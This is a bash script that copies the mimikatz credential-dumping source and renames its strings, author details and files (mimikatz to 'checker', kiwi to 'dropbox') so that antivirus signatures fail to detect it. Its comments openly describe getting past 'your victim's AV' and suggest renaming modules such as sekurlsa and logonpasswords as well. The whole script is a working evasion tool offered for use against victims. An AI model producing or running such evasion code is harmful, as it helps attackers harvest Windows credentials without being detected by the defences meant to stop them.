# This script downloads and slightly "obfuscates" the mimikatz project.
# Most AV solutions block mimikatz based on certain keywords in the binary like "mimikatz", "gentilkiwi", "benjamin@gentilkiwi.com" ..., 
# so removing them from the project before compiling gets us past most of the AV solutions.
# We can even go further and change some functionality keywords like "sekurlsa", "logonpasswords", "lsadump", "minidump", "pth" ....,
# but this needs adapting to the doc, so it has not been done, try it if your victim's AV still detects mimikatz after this program.

OBF_PROJECT_DIR="obf"

echo '[*] Building project directory'
if [[ -d $OBF_PROJECT_DIR ]]; then
    echo '[*] Removing previous directory'
    rm -rf $OBF_PROJECT_DIR
fi
mkdir $OBF_PROJECT_DIR

echo '[*] Copying files'
cp -r mimikatz $OBF_PROJECT_DIR/checker

if [[ -d $OBF_PROJECT_DIR/checker/Win32 ]]; then
    echo '[*] Removing unnecessary win32 files'
    rm -rf mimikatz/Win32
fi
if [[ -d $OBF_PROJECT_DIR/checker/x64 ]]; then
    echo '[*] Removing unnecessary x64 files'
    rm -rf mimikatz/x64
fi

cp -r inc       $OBF_PROJECT_DIR/
cp -r lib       $OBF_PROJECT_DIR/
cp -r mimidrv   $OBF_PROJECT_DIR/
cp -r modules   $OBF_PROJECT_DIR/

cp -r kiwi_passwords.yar    $OBF_PROJECT_DIR/dropbox_passwords.yar
cp -r mimicom.idl           $OBF_PROJECT_DIR/checkcom.idl
cp -r mimikatz.sln          $OBF_PROJECT_DIR/checker.sln

echo '[*] Obfuscating: mimikatz->checker'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/mimikatz/checker/g'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/MIMIKATZ/CHECKER/g'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/Mimikatz/Checker/g'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/mimicom/checkcom/g'
echo '[*] Obfuscating: kiwi->dropbox'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/kiwi/dropbox/g'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/KIWI/DROPBOX/g'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/Kiwi/Dropbox/g'
echo '[*] Obfuscating: DELPY->SHELBY'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/DELPY/SHELBY/g'
echo '[*] Obfuscating: Benjamin->Daniel'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/Benjamin/Daniel/g'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/benjamin@gentilkiwi.com/sdaniel@hotmail.com/g'
echo '[*] Obfuscating: creativecommons->creativecloud'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/creativecommons/creativecloud/g'
echo '[*] Obfuscating: gentilkiwi->phony'
find $OBF_PROJECT_DIR -type f -print0 | xargs -0 sed -i 's/gentilkiwi/phony/g'

echo '[*] Reanaming files: mimikatz->checker'
find $OBF_PROJECT_DIR -type f -name '*mimikatz*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/mimikatz/checker/g')";
	mv "${FILE}" "${newfile}";
done
find $OBF_PROJECT_DIR -type f -name '*mimicom*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/mimicom/checkcom/g')";
	mv "${FILE}" "${newfile}";
done
echo '[*] Reanaming files: kiwi->checker'
find $OBF_PROJECT_DIR -type f -name '*kiwi*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/kiwi/dropbox/g')";
	mv "${FILE}" "${newfile}";
done
echo '[!] Done'
